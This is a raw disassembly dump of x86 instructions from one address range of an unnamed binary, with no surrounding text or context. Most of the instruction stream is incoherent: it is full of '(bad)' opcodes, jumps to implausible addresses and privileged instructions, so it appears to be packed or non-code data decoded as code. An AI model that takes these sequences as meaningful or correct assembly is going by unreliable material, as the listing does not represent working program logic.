  40a9f9:	and    al,0x76
  40a9fb:	clc    
  40a9fc:	or     BYTE PTR [edi],al
  40a9fe:	mov    dl,0xfd
  40aa00:	push   cs
  40aa01:	hlt    
  40aa02:	sbb    eax,0x156fc76
  40aa07:	inc    esi
  40aa08:	std    
  40aa09:	repz or eax,0x73f6ac8a
  40aa0f:	inc    esi
  40aa10:	in     al,0x56
  40aa12:	xchg   ebx,eax
  40aa13:	add    edi,esp
  40aa15:	jns    0x40aa08
  40aa17:	jmp    0x79d6:0xfbedf520
  40aa1e:	fst    QWORD PTR [eax+ebx*8+0x1f]
  40aa22:	fdiv   st(3),st
  40aa24:	(bad)  
  40aa25:	jge    0x40aa52
  40aa27:	call   0x5021b9e
  40aa2c:	cmp    al,0x3b
  40aa2e:	push   0x79
  40aa30:	pushf  
  40aa31:	push   es
  40aa32:	xor    eax,0xe907182a
  40aa37:	jmp    0xf488:0xc33f35d
  40aa3e:	outs   dx,BYTE PTR ds:[esi]
  40aa3f:	sti    
  40aa40:	mov    ?,ebx
  40aa42:	adc    ebp,esp
  40aa44:	xchg   BYTE PTR [ecx-0x1f],bh
  40aa47:	jmp    0x40aa6d
  40aa49:	mov    WORD PTR [ebp+0x797976fb],cs
  40aa4f:	sti    
  40aa50:	in     al,0xfe
  40aa52:	nop
  40aa53:	dec    esi
  40aa54:	outs   dx,DWORD PTR ds:[esi]
  40aa55:	repz jne 0x40aa53
  40aa58:	in     al,0xe2
  40aa5a:	ins    DWORD PTR es:[edi],dx
  40aa5b:	jno    0x40aa5d
	...
  40aa6d:	add    al,ch
  40aa6f:	fisub  WORD PTR ds:0x5df34e83
  40aa75:	jno    0x40aab7
  40aa77:	fisub  WORD PTR [ebp+ecx*4+0x714df33e]
  40aa7e:	inc    esp
  40aa7f:	fisubr WORD PTR [ebp+ecx*4+0x713df32e]
  40aa86:	sbb    dh,bl
  40aa88:	push   esp
  40aa8a:	ins    DWORD PTR es:[edi],dx
  40aa8b:	hlt    
  40aa8c:	inc    BYTE PTR [eax-0x7e]
  40aa8f:	icebp  
  40aa90:	(bad)  
  40aa91:	or     edi,DWORD PTR es:[edx-0x4]
  40aa95:	push   ds
  40aa96:	loope  0x40aad8
  40aa98:	aas    
  40aa99:	test   al,0xf3
  40aa9b:	xchg   ebx,eax
  40aa9d:	in     eax,0xb
  40aa9f:	pushf  
  40aaa0:	sti    
  40aaa1:	push   es
  40aaa2:	jmp    0x40aa63
  40aaa4:	rcr    ecx,0xf3
  40aaa7:	pop    ebx
  40aaa8:	mov    eax,DWORD PTR ds:0xee005d47
  40aaae:	pusha  
  40aaaf:	jmp    edi
  40aab1:	call   0x55ab:0x72fef178
  40aab8:	call   0x47c9b6
  40aabd:	loop   0x40aa72
  40aabf:	jbe    0x40aadc
  40aac1:	jmp    0x3a73:0xdbeb4ab6
  40aac8:	or     eax,0x3786f13d
  40aacd:	jecxz  0x40aaef
  40aacf:	or     al,0xc6
  40aad1:	jmp    0x40aad6
	...
  40aae2:	add    BYTE PTR [eax],al
  40aae4:	repz fld QWORD PTR [ecx]
  40aae7:	xchg   edx,eax
  40aae8:	lock cmp ebp,DWORD PTR ds:[edx-0x557522fa]
  40aaf0:	push   ss
  40aaf1:	rol    cl,0xed
  40aaf4:	repz pop ebx
  40aaf6:	mov    ecx,DWORD PTR [ebp+0x1eb3c66e]
  40aafc:	pop    ebx
  40aafd:	jnp    0x40ab0b
  40aaff:	add    DWORD PTR [esi-0x199017c],0xaae474c6
  40ab09:	mov    edi,0xf1f3f9c1
  40ab0e:	je     0x40aaed
  40ab10:	dec    ebx
  40ab11:	test   DWORD PTR [ebx+0x9ecb600],ebp
  40ab17:	rcr    BYTE PTR [ebp+0x7],0x5f
  40ab1b:	leave  
  40ab1c:	retf   
  40ab1d:	adc    eax,0x25cff00
  40ab22:	push   DWORD PTR [ebp+0x9]
  40ab25:	fisubr WORD PTR [ecx-0x5]
  40ab28:	out    0xec,al
  40ab2a:	mov    eax,DWORD PTR [ebp-0x27]
  40ab2d:	push   ebp
  40ab2e:	push   DWORD PTR [ebp+0x15]
  40ab31:	fidivr WORD PTR [edi]
  40ab33:	(bad)  
  40ab34:	imul   ah
  40ab36:	or     eax,eax
  40ab38:	(bad)  
  40ab39:	jno    0x40ab35
  40ab3b:	add    cl,cl
  40ab3d:	add    eax,0xefc575ff
  40ab42:	jae    0x40ab3c
  40ab44:	mov    eax,ds:0xff92c8
	...
  40ab59:	add    BYTE PTR [esi+0x4d0fc003],ah
  40ab5f:	rol    BYTE PTR [eax],1
  40ab61:	add    cl,cl
  40ab63:	jl     0x40aba8
  40ab65:	in     al,dx
  40ab66:	and    dh,bl
  40ab68:	jle    0x40aba9
  40ab6a:	cdq    
  40ab6b:	inc    BYTE PTR [ebx+0x58bc9]
  40ab71:	push   edi
  40ab72:	mov    cl,0x41
  40ab74:	(bad)  
  40ab75:	call   DWORD PTR [esi+0x7d]
  40ab78:	inc    ebx
  40ab79:	shl    BYTE PTR [esi+0x61],1
  40ab7c:	shr    BYTE PTR [eax+0x53],1
  40ab7f:	das    
  40ab80:	inc    ecx
  40ab81:	add    BYTE PTR [ecx+0x11],dh
  40ab84:	pop    ebx
  40ab85:	add    BYTE PTR [ecx+0x55],bl
  40ab88:	push   DWORD PTR [ebp-0x77]
  40ab8b:	(bad)  
  40ab8c:	into   
  40ab8d:	aas    
  40ab8e:	or     BYTE PTR [ebx],cl
  40ab90:	call   0x4badac
  40ab95:	push   eax
  40ab96:	(bad)  
  40ab97:	popa   
  40ab98:	shr    BYTE PTR [eax+0xb],1
  40ab9b:	xor    BYTE PTR [ecx+0x0],al
  40ab9e:	lock inc edi
  40aba0:	or     ebx,DWORD PTR [ebx-0x10]
  40aba3:	fistp  WORD PTR [ecx+ebx*2-0x5]
  40aba7:	pop    ds
  40aba8:	jo     0x40abb6
  40abaa:	sti    
  40abab:	or     eax,0x26eb0870
  40abb0:	or     DWORD PTR [ebp+0x2dd95],eax
  40abb6:	sti    
  40abb7:	outs   dx,DWORD PTR ss:[esi]
  40abb9:	or     DWORD PTR [edi],ebp
  40abbb:	stos   BYTE PTR es:[edi],al
  40abbc:	scas   al,BYTE PTR es:[edi]
	...
  40abcd:	add    BYTE PTR [eax],al
  40abcf:	add    al,dh
  40abd1:	fild   WORD PTR [edx]
  40abd3:	jmp    0x40abc4
  40abd5:	sub    BYTE PTR [edi],bh
  40abd7:	mov    ah,0xf0
  40abd9:	fld    QWORD PTR [edx]
  40abdb:	add    ah,ah
  40abdd:	lods   eax,DWORD PTR ds:[esi]
  40abde:	ret    0xdfb8
  40abe1:	stc    
  40abe2:	idiv   esi
  40abe4:	loop   0x40ac16
  40abe6:	cmp    al,0x7
  40abe8:	inc    ebp
  40abe9:	fidivr WORD PTR [edi+0x2ded844]
  40abef:	add    al,dh
  40abf1:	pop    ebp
  40abf2:	cmp    BYTE PTR [eax],al
  40abf4:	out    0x69,eax
  40abf6:	dec    esp
  40abf7:	add    dh,al
  40abf9:	fisttp QWORD PTR [edi-0x18]
  40abfc:	(bad)  
  40abfd:	mov    al,0xf7
  40abff:	(bad)  
  40ac00:	imul   esp,DWORD PTR [ebx],0xc61582c8
  40ac06:	add    dh,BYTE PTR [ebp-0x2f]
  40ac09:	adc    eax,0xde312bce
  40ac0e:	div    DWORD PTR [esp+ebp*4-0x7a]
  40ac12:	test   eax,0xbddf059
  40ac17:	sar    bh,0x62
  40ac1a:	push   es
  40ac1b:	add    dh,al
  40ac1d:	fnstsw WORD PTR [edi+0x2df4844]
  40ac23:	add    al,dh
  40ac25:	xchg   BYTE PTR [ecx],al
  40ac27:	add    dh,al
  40ac29:	push   es
  40ac2a:	jmp    0xe81f70b3
  40ac2f:	outs   dx,BYTE PTR ds:[esi]
  40ac30:	out    dx,eax
  40ac31:	jge    0x40ac06
  40ac33:	fild   WORD PTR [eax]
	...
  40ac45:	add    BYTE PTR [esi],ch
  40ac47:	dec    edx
  40ac48:	inc    ecx
  40ac49:	add    eax,0xeae906f0
  40ac4e:	pop    ebp
  40ac4f:	push   es
  40ac50:	jmp    0x41b31f58
  40ac55:	add    eax,0x765fff9d
  40ac5a:	adc    al,cl
  40ac5c:	stos   DWORD PTR es:[edi],eax
  40ac5d:	jmp    0x40ac51
  40ac5f:	push   es
  40ac60:	jmp    0xe7e6b568
  40ac65:	add    esi,eax
  40ac67:	or     DWORD PTR [ebx-0x9860d15],0xffffff8a
  40ac6e:	shl    DWORD PTR fs:0xe90ac83e,cl
  40ac75:	add    esi,eax
  40ac77:	fstp   QWORD PTR [edx+eax*1-0x10]
  40ac7b:	push   es
  40ac7c:	push   0x79
  40ac7e:	fmul   DWORD PTR [edx]
  40ac80:	push   esp
  40ac81:	pop    es
  40ac82:	imul   esi,DWORD PTR [ecx-0x4f],0xe3df2cbf
  40ac89:	add    esi,eax
  40ac8b:	push   es
  40ac8c:	shr    BYTE PTR [edi-0xf],1
  40ac8f:	push   es
  40ac90:	jmp    0xec1fc917
  40ac95:	push   es
  40ac96:	ins    DWORD PTR es:[edi],dx
  40ac97:	callw  0x9c9e
  40ac9b:	jge    0x40acc0
  40ac9d:	shl    BYTE PTR [edx+0x71],1
  40aca0:	push   ebp
  40aca1:	add    al,0x4
  40aca3:	(bad)  
  40aca4:	lods   eax,DWORD PTR ds:[esi]
  40aca5:	inc    ecx
  40aca6:	mov    BYTE PTR [ecx+ebp*8],al
  40aca9:	add    eax,DWORD PTR [eax]
	...
  40acbb:	add    al,dh
  40acbd:	fucomi st,st(5)
  40acbf:	mov    esi,0x3e6deac
  40acc4:	lock push es
  40acc6:	add    BYTE PTR [esi-0x1700394f],ch
  40accc:	repz push es
  40acce:	(bad)  
  40accf:	lods   al,BYTE PTR ds:[esi]
  40acd0:	cmp    ebp,edi
  40acd2:	(bad)  
  40acd3:	jmp    0x2d8574cb
  40acd8:	in     al,dx
  40acd9:	push   es
  40acda:	add    cl,ch
  40acdc:	outs   dx,BYTE PTR ds:[esi]
  40acdd:	dec    edx
  40acde:	mov    esp,0x6f3e9
  40ace3:	es mov cl,0xae
  40ace6:	(bad)  
  40ace7:	call   0xb53fb3df
  40acec:	das    
  40aced:	out    0x12,eax
  40acef:	daa    
  40acf0:	(bad)  
  40acf1:	out    dx,eax
  40acf2:	mov    BYTE PTR [ebx+esi*1+0x43574f0],ah
  40acf9:	pop    es
  40acfa:	dec    BYTE PTR [esi]
  40acfc:	out    0x7f,eax
  40acfe:	inc    esp
  40acff:	xor    edi,ebx
  40ad01:	jae    0x40acd7
  40ad03:	adc    ecx,ebx
  40ad05:	jmp    0x40ad05
  40ad07:	mul    BYTE PTR [ebx+eax*2-0x3c]
  40ad0b:	push   0x9
  40ad0d:	dec    ebp
  40ad0e:	aas    
  40ad0f:	sub    ah,ch
  40ad11:	push   es
  40ad12:	jne    0x40ad4f
  40ad14:	dec    esp
  40ad15:	inc    edx
  40ad16:	inc    eax
  40ad17:	sub    ah,ch
  40ad19:	fimul  WORD PTR [eax+esi*1]
  40ad1c:	hlt    
  40ad1d:	push   es
  40ad1e:	push   eax
  40ad1f:	push   ecx
	...
  40ad30:	add    BYTE PTR [eax],al
  40ad32:	cmp    eax,DWORD PTR [edi+0x41]
  40ad35:	jmp    0xc20120e0
  40ad3a:	dec    esi
  40ad3b:	push   eax
  40ad3c:	add    cl,ch
  40ad3e:	cli    
  40ad3f:	(bad)  
  40ad40:	jae    0x40ad43
  40ad42:	adc    al,0x59
  40ad44:	inc    eax
  40ad45:	sub    ah,dh
  40ad47:	fdivrp st(0),st
  40ad49:	xor    esp,ebp
  40ad4b:	push   es
  40ad4c:	push   eax
  40ad4d:	add    edx,eax
  40ad4f:	inc    esi
  40ad50:	inc    ecx
  40ad51:	add    BYTE PTR [ecx-0xb],bl
  40ad54:	jae    0x40ad16
  40ad56:	sbb    DWORD PTR [ecx+0x1490058],0x628b74c0
  40ad60:	pop    edx
  40ad61:	inc    eax
  40ad62:	cwde   
  40ad63:	or     ch,al
  40ad65:	aad    0x31
  40ad67:	or     al,BYTE PTR [eax]
  40ad69:	push   eax
  40ad6a:	xor    DWORD PTR [eax+0x40],edx
  40ad6d:	inc    ecx
  40ad6e:	sbb    ebp,esi
  40ad70:	jae    0x40ad32
  40ad72:	rcr    DWORD PTR [edx+ebx*2+0x0],0x9
  40ad77:	loope  0x40ad8f
  40ad79:	push   0x414a2a
  40ad7e:	mov    cl,0xb0
  40ad80:	push   esi
  40ad81:	add    BYTE PTR [ecx],bl
  40ad83:	pop    edx
  40ad84:	push   0x434963
  40ad89:	call   DWORD PTR [edx+ecx*8-0x1a]
  40ad8d:	pop    ebp
  40ad8e:	mov    ds:0x190b0009,eax
  40ad93:	ja     0x40adf7
  40ad95:	inc    DWORD PTR [eax]
	...
  40ada7:	add    BYTE PTR [edx+eax*8-0x1a],ah
  40adab:	mov    eax,ds:0x50000981
  40adb0:	ficomp WORD PTR [ebp-0x38]
  40adb3:	call   0x3e9e97
  40adb8:	inc    eax
  40adb9:	cs mov esp,0xe6c714ff
  40adbf:	(bad)  
  40adc0:	loope  0x40adc4
  40adc2:	add    BYTE PTR [eax-0x52],dl
  40adc5:	pop    ebp
  40adc6:	(bad)  
  40adc7:	call   0x3e9d5f
  40adcc:	adc    BYTE PTR [esi],ch
  40adce:	mov    eax,0xfec2dc83
  40add3:	jae    0x40ad7a
  40add5:	xchg   BYTE PTR [ebx-0x48],bh
  40add8:	mov    DWORD PTR [ebp+0x2e],ebx
  40addb:	push   0xef02dff0
  40ade0:	scas   al,BYTE PTR es:[edi]
  40ade1:	jl     0x40ae51
  40ade3:	or     BYTE PTR [eax-0x6e],bl
  40ade6:	cmp    dh,0x5f
  40ade9:	ins    BYTE PTR es:[edi],dx
  40adea:	outs   dx,DWORD PTR ds:[esi]
  40adeb:	rcl    BYTE PTR [edi-0x16],0xa
  40adef:	call   0xff3611a8
  40adf4:	inc    edi
  40adf5:	retf   0xfeb6
  40adf8:	(bad)
  40adfb:	cmp    BYTE PTR [esp+edx*2-0xb],ch
  40adff:	(bad)  
  40ae00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae01:	xchg   edi,eax
  40ae02:	hlt    
  40ae03:	je     0x40adfd
  40ae05:	push   edi
  40ae06:	test   BYTE PTR es:[edi],bl
  40ae09:	sub    al,0xf5
  40ae0b:	je     0x40ae0d
	...
  40ae1d:	add    BYTE PTR [eax],dh
  40ae1f:	inc    edi
  40ae20:	cmp    DWORD PTR [edi+0x74f51c0f],eax
  40ae26:	cmp    BYTE PTR [edi],dl
  40ae28:	xor    DWORD PTR [edi+0x74f50bff],eax
  40ae2e:	sub    al,0x7
  40ae30:	sub    DWORD PTR [edi+0x74f4fdef],eax
  40ae36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae37:	push   ss
  40ae38:	and    DWORD PTR [edi+0x74f3eddf],eax
  40ae3e:	cwde   
  40ae3f:	push   es
  40ae40:	sbb    DWORD PTR [edi+0xce7ddcf],eax
  40ae46:	jae    0x40aeab
  40ae48:	in     al,dx
  40ae49:	add    eax,0x44bbe545
  40ae4e:	enter  0x2e0,0x0
  40ae52:	lock pusha 
  40ae54:	jbe    0x40ae3e
  40ae56:	lock sub DWORD PTR [eax+ebp*2],esi
  40ae5a:	stos   BYTE PTR es:[edi],al
  40ae5b:	cli    
  40ae5c:	inc    edx
  40ae5d:	add    BYTE PTR [edi+0x47e7c82b],dl
  40ae63:	push   ss
  40ae64:	add    al,0x0
  40ae66:	sti    
  40ae67:	push   es
  40ae68:	test   eax,0x23c3f76e
  40ae6d:	in     al,dx
  40ae6e:	lock push es
  40ae70:	jmp    0x29848678
  40ae75:	inc    ebx
  40ae76:	lock jmp 0x40ae74
  40ae79:	(bad)  
  40ae7a:	push   edi
  40ae7b:	mov    WORD PTR [eax],fs
  40ae7d:	add    al,0xf0
  40ae7f:	jmp    FWORD PTR [eax+0x6e]
	...
  40ae91:	add    BYTE PTR [eax],al
  40ae93:	add    bh,dh
  40ae95:	ret    
  40ae96:	and    ebp,esp
  40ae98:	icebp  
  40ae99:	push   es
  40ae9a:	jmp    0x2db2eda2
  40ae9f:	jmp    0x40aec6
  40aea1:	test   DWORD PTR [ebp-0xc],edx
  40aea4:	sub    edi,DWORD PTR [eax]
  40aea6:	sub    DWORD PTR [edx-0xbba13da],edi
  40aeac:	and    DWORD PTR [ebp-0x7e190300],ebx
  40aeb2:	test   dh,dh
  40aeb4:	push   cs
  40aeb5:	in     al,dx
  40aeb6:	sub    eax,0x5cdf206e
  40aebb:	jge    0x40aebb
  40aebd:	jmp    0x40aedc
  40aebf:	outs   dx,BYTE PTR ds:[esi]
  40aec0:	add    al,0xdf
  40aec2:	inc    esp
  40aec3:	jge    0x40aeb3
  40aec5:	jmp    0x40af22
  40aec7:	ds loopne 0x40af20
  40aeca:	adc    ecx,edx
  40aecc:	imul   ebp,ebx,0xfffffffd
  40aecf:	jmp    0xbe2e:0xf3f5ede6
  40aed6:	sub    dl,BYTE PTR [ebx]
  40aed8:	lock push ecx
  40aeda:	jb     0x40aebc
  40aedc:	jo     0x40aea0
  40aede:	xchg   esp,eax
  40aedf:	repnz mov dh,0xeb
  40aee2:	lods   eax,DWORD PTR ds:[esi]
  40aee3:	mov    DWORD PTR [edi-0x14],esp
  40aee6:	int    0xf3
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	jmp    0x40aed3
  40aeeb:	add    ebp,DWORD PTR [ebx+0x41]
  40aeee:	aad    0xfe
  40aef0:	push   edi
  40aef1:	jb     0x40aef3
  40aef3:	in     al,dx
  40aef4:	jae    0x40af29
  40aef6:	add    BYTE PTR [eax+eax*1],dh
	...
  40af09:	add    cl,bh
  40af0b:	(bad)  
  40af0d:	call   0x153fb605
  40af12:	fcomp  st(6)
  40af14:	pop    ebp
  40af15:	js     0x40af7a
  40af17:	in     al,dx
  40af18:	or     ch,BYTE PTR [ecx-0x49980417]
  40af1e:	adc    BYTE PTR [esi+0x0],al
  40af21:	jle    0x40aefc
  40af23:	adc    ch,al
  40af25:	jb     0x40aef4
  40af27:	in     al,dx
  40af28:	inc    BYTE PTR [edx+0x15d45ef1]
  40af2e:	mov    ch,0x6
  40af30:	call   esp
  40af32:	(bad)  
  40af34:	jmp    0x40af96
  40af36:	and    ebp,esp
  40af38:	mov    BYTE PTR [esp+edx*2-0x17],ah
  40af3c:	inc    BYTE PTR [esi-0x44]
  40af3f:	sub    al,0x1
  40af41:	jmp    0x2bc52939
  40af46:	add    ch,ah
  40af48:	(bad)  
  40af49:	cdq    
  40af4a:	sub    esp,DWORD PTR [edi-0x7a]
  40af4d:	add    edi,DWORD PTR es:[edx-0x7c]
  40af51:	sub    eax,DWORD PTR [edx]
  40af53:	in     al,dx
  40af54:	(bad)  
  40af55:	mov    ecx,0xfb7b3e2
  40af5a:	jecxz  0x40af45
  40af5c:	out    0x49,eax
  40af5e:	cmp    eax,DWORD PTR [edi]
  40af60:	add    BYTE PTR [eax+0x69],dh
  40af63:	scas   al,BYTE PTR es:[edi]
  40af64:	std    
  40af65:	test   dl,0x2a
  40af68:	pcmpgtw mm5,QWORD PTR [ebx+0x7]
  40af6c:	add    cl,ch
	...
  40af7e:	add    BYTE PTR [eax],al
  40af80:	jo     0x40af15
  40af82:	rcr    edi,0xc2
  40af85:	jmp    0x7449b80
  40af8a:	add    cl,ch
  40af8c:	repnz add BYTE PTR [edx+0x68900],0x8d
  40af94:	retf   
  40af95:	es push eax
  40af97:	push   0x410a53
  40af9c:	mov    cl,0x5b
  40af9e:	push   edi
  40af9f:	add    BYTE PTR [ecx-0x738a4117],cl
  40afa5:	retf   
  40afa6:	inc    edi
  40afa7:	add    DWORD PTR [ecx+0x6],ebx
  40afaa:	lea    edx,[ebp-0x20765]
  40afb0:	in     al,0x43
  40afb2:	sub    al,0x50
  40afb4:	add    edi,eax
  40afb6:	sub    al,BYTE PTR [ecx+0x59]
  40afb9:	into   
  40afba:	pop    edx
  40afbb:	push   edi
  40afbc:	pop    ecx
  40afbd:	push   es
  40afbe:	or     eax,eax
  40afc0:	sbb    al,0xff
  40afc2:	call   0x46f7f3
  40afc7:	dec    DWORD PTR [edx+edx*1-0x18]
  40afcb:	mov    edx,0xbfdf4a9
  40afd0:	leave  
  40afd1:	outs   dx,BYTE PTR ds:[esi]
  40afd2:	punpckhbw mm6,mm7
  40afd5:	or     eax,0x6ec60041
  40afda:	adc    al,0xe8
  40afdc:	pop    esi
  40afdd:	imul   edi,esi,0xffffffff
  40afe0:	loop   0x40afcd
  40afe2:	push   0x0
	...
  40aff3:	add    BYTE PTR [eax],al
  40aff5:	add    dh,dl
  40aff7:	outs   dx,BYTE PTR ds:[esi]
  40aff8:	adc    al,0xe8
  40affa:	xchg   edx,eax
  40affb:	push   0xfffffffe
  40affd:	inc    DWORD PTR [edi+ecx*4-0x40]
  40b001:	(bad)  
  40b002:	div    ah
  40b004:	mov    edx,DWORD PTR [edx-0x5b]
  40b007:	push   ebx
  40b008:	push   eax
  40b009:	call   0x3f1b64
  40b00e:	imul   edx,DWORD PTR [ebp-0x1],0x73f6b975
  40b015:	or     al,0x96
  40b017:	jno    0x40b021
  40b019:	call   0xff327d0e
  40b01e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b01f:	(bad)  
  40b020:	mov    BYTE PTR [edi+ebx*4-0xf232540],al
  40b027:	fild   WORD PTR [edx]
  40b029:	lea    esi,[edx]
  40b02b:	add    al,0x7b
  40b02d:	test   BYTE PTR [ecx+ebx*4],bh
  40b030:	lock dec BYTE PTR [eax]
  40b033:	imul   esi,DWORD PTR [ecx],0x41
  40b036:	lock mov BYTE PTR [esi-0xf6f914d],dh
  40b03d:	out    0xed,eax
  40b03f:	aaa    
  40b040:	add    al,0x0
  40b042:	jmp    0x40afe3
  40b044:	ja     0x40b074
  40b046:	enter  0x1b89,0x41
  40b04a:	lock jo 0x40b0c4
  40b04d:	adc    al,0x58
  40b04f:	jo     0x40b0cd
  40b051:	(bad)  
  40b052:	aas    
  40b053:	pusha  
  40b054:	mov    bh,0xb3
  40b056:	ss dec eax
  40b058:	icebp  
  40b059:	dec    edi
	...
  40b06a:	add    BYTE PTR [eax],al
  40b06c:	sbb    BYTE PTR [eax],dl
  40b06e:	jnp    0x40b06e
  40b070:	daa    
  40b071:	scas   eax,DWORD PTR es:[edi]
  40b072:	out    dx,eax
  40b073:	je     0x40b075
  40b075:	inc    ecx
  40b076:	ja     0x40b084
  40b078:	shr    BYTE PTR [eax],0x77
  40b07b:	or     BYTE PTR [eax],bl
  40b07d:	xor    ah,ch
  40b07f:	inc    BYTE PTR [edi]
  40b081:	inc    edi
  40b082:	cmp    DWORD PTR [ebp-0x4b0ee001],eax
  40b088:	cmp    al,0x9
  40b08a:	icebp  
  40b08b:	(bad)  
  40b08c:	fmul   st,st(6)
  40b08e:	pop    eax
  40b08f:	add    al,dh
  40b091:	pop    esp
  40b092:	in     al,dx
  40b093:	add    DWORD PTR [edx-0x36],esp
  40b096:	jnp    0x40b02c
  40b098:	pushf  
  40b099:	call   0xe34af8d
  40b09e:	test   ecx,ebp
  40b0a0:	bnd jg 0x40b024
  40b0a3:	cmp    DWORD PTR [esi],ecx
  40b0a5:	pop    es
  40b0a6:	pop    edx
  40b0a7:	ja     0x40b09b
  40b0a9:	fld    TBYTE PTR [eax]
  40b0ab:	pop    esp
  40b0ac:	push   esp
  40b0ad:	sub    BYTE PTR [eax],ch
  40b0af:	add    al,0xa7
  40b0b1:	mov    dl,0x94
  40b0b3:	icebp  
  40b0b4:	sahf   
  40b0b5:	call   0x77f418a
  40b0ba:	jmp    0xf5f7c912
  40b0bf:	inc    edx
  40b0c0:	lock out 0x73,eax
  40b0c3:	mov    bh,0x7d
  40b0c5:	call   0x50a68c6f
  40b0ca:	jmp    0x549f70d2
  40b0cf:	xor    BYTE PTR [eax],al
	...
  40b0e1:	add    BYTE PTR [ecx-0x5c4971fa],dh
  40b0e7:	jmp    0x6a90a171
  40b0ec:	push   ss
  40b0ed:	add    al,0xf0
  40b0ef:	dec    esp
  40b0f0:	adc    ch,bh
  40b0f2:	xchg   DWORD PTR [edx-0x1f],esi
  40b0f5:	cld    
  40b0f6:	and    DWORD PTR [edx-0x13],esi
  40b0f9:	cld    
  40b0fa:	sub    BYTE PTR [ebx+0xf],dh
  40b0fd:	pop    esp
  40b0fe:	dec    esi
  40b0ff:	pop    ds
  40b100:	test   al,0x3
  40b102:	daa    
  40b103:	jb     0x40b0fa
  40b105:	fist   DWORD PTR [esi+edi*2-0x4de90fbb]
  40b10c:	je     0x40b0ff
  40b10e:	push   cs
  40b10f:	call   0x7f958cac
  40b114:	sub    eax,0x9be7aff0
  40b119:	adc    esi,edi
  40b11b:	jno    0x40b10a
  40b11d:	push   ebx
  40b11e:	out    dx,eax
  40b11f:	jno    0x40b102
  40b121:	(bad)  [ebx-0x280ff214]
  40b127:	mov    eax,ds:0x79d6f06c
  40b12c:	arpl   bp,ax
  40b12e:	int    0xe7
  40b130:	push   ebp
  40b132:	and    ch,al
  40b134:	mov    ah,0x2d
  40b136:	shr    eax,0xfe
  40b139:	shr    ebx,1
  40b13b:	push   eax
  40b13c:	add    cl,ch
  40b13e:	js     0x40b0e7
  40b140:	push   cs
  40b141:	ins    BYTE PTR es:[edi],dx
  40b142:	sub    cl,ch
  40b144:	dec    dh
	...
  40b156:	add    BYTE PTR [eax],al
  40b158:	(bad)  
  40b159:	mov    dl,0xbb
  40b15b:	mov    DWORD PTR [edi+0x25efe7e8],0x49b60007
  40b165:	scas   eax,DWORD PTR es:[edi]
  40b166:	std    
  40b167:	scas   al,BYTE PTR es:[edi]
  40b168:	(bad)  
  40b169:	fbstp  TBYTE PTR [ebp+ebp*2-0x79]
  40b16d:	call   0x7455d3a
  40b172:	push   ebp
  40b173:	bound  edx,QWORD PTR [eax-0x18]
  40b176:	je     0x40b155
  40b178:	dec    esi
  40b179:	jb     0x40b18b
  40b17b:	xchg   cl,bl
  40b17d:	cli    
  40b17e:	(bad)  
  40b17f:	hlt    
  40b180:	dec    ebx
  40b181:	ffreep st(3)
  40b183:	je     0x40b1dc
  40b185:	call   0x7315d52
  40b18a:	push   ebp
  40b18b:	jb     0x40b1dd
  40b18d:	test   bl,al
  40b18f:	pop    ecx
  40b190:	(bad)  
  40b191:	out    0x74,eax
  40b193:	in     eax,0x4b
  40b195:	popa   
  40b196:	mov    DWORD PTR [esi+0xf],ecx
  40b199:	cld    
  40b19a:	mov    edi,0xc947e8bc
  40b19f:	sub    esi,eax
  40b1a1:	push   es
  40b1a2:	(bad)  
  40b1a3:	mov    esp,0x6054dee3
  40b1a8:	psubsb mm1,QWORD PTR [edx]
  40b1ab:	sub    DWORD PTR [ecx+0x1],edi
  40b1ae:	pop    edi
  40b1af:	xor    BYTE PTR [edx+0x69160012],dh
  40b1b5:	adc    ebp,eax
  40b1b7:	lock pop esi
  40b1b9:	in     eax,0xfe
	...
  40b1cb:	add    BYTE PTR [eax],al
  40b1cd:	add    dl,ah
  40b1cf:	retf   0xf73
  40b1d2:	popa   
  40b1d3:	aam    0x26
  40b1d5:	inc    ecx
  40b1d6:	fprem1 
  40b1d8:	jae    0x40b1e6
  40b1da:	icebp  
  40b1db:	pushf  
  40b1dc:	test   edi,edi
  40b1de:	into   
  40b1df:	ror    DWORD PTR [eax],0x6a
  40b1e2:	cdq    
  40b1e3:	cmc    
  40b1e4:	jae    0x40b1f2
  40b1e6:	mov    cl,0x80
  40b1e8:	test   edi,edi
  40b1ea:	scas   al,BYTE PTR es:[edi]
  40b1eb:	arpl   WORD PTR [esp+esi*8+0x41],ax
  40b1ef:	ins    DWORD PTR es:[edi],dx
  40b1f0:	aas    
  40b1f1:	inc    ecx
  40b1f2:	cdq    
  40b1f3:	cmc    
  40b1f4:	jae    0x40b1ea
  40b1f6:	mov    cl,0x90
  40b1f8:	test   edi,edi
  40b1fa:	dec    esi
  40b1fb:	arpl   WORD PTR [eax+edi*8-0x1f],ax
  40b1ff:	sar    bl,0x0
  40b202:	pop    ecx
  40b203:	ret    0x8403
  40b206:	jle    0x40b1fd
  40b208:	xchg   DWORD PTR [ebp+0x6d],eax
  40b20b:	inc    edx
  40b20c:	add    BYTE PTR [eax],dl
  40b20e:	dec    ecx
  40b20f:	or     ch,al
  40b211:	clc    
  40b212:	(bad)  
  40b214:	std    
  40b215:	mov    DWORD PTR [ebx+ebx*8],edx
  40b218:	std    
  40b219:	jne    0x40b1dc
  40b21b:	shr    DWORD PTR [eax+0x9f4ce88],0xc0
  40b222:	push   ds
  40b223:	mov    ?,WORD PTR [ebx-0xf5e700]
  40b229:	jne    0x40b1ec
  40b22b:	inc    ecx
  40b22c:	call   0xff4abc2e
  40b231:	jne    0x40b233
	...
  40b243:	add    ch,cl
  40b245:	rol    DWORD PTR [eax-0x7cf5e6ab],0xf8
  40b24c:	or     esp,ebp
  40b24e:	test   BYTE PTR [ecx+ecx*1-0x7374fff6],ah
  40b255:	cmc    
  40b256:	jle    0x40b297
  40b258:	lock out dx,eax
  40b25a:	std    
  40b25b:	cmp    DWORD PTR [eax-0x11],0x2
  40b25f:	add    BYTE PTR [eax+0x61],cl
  40b262:	cs inc ecx
  40b264:	lock jl 0x40b241
  40b267:	cmp    DWORD PTR [esi],ebx
  40b269:	lock add cl,BYTE PTR [ebx]
  40b26c:	mov    al,0x5b
  40b26e:	jbe    0x40b26f
  40b270:	cmp    eax,0xffff5be8
  40b275:	out    dx,eax
  40b276:	add    bh,bh
  40b278:	sbb    eax,0xc8e05bc0
  40b27d:	cs add al,0x68
  40b280:	outs   dx,BYTE PTR ds:[esi]
  40b281:	or     al,0x43
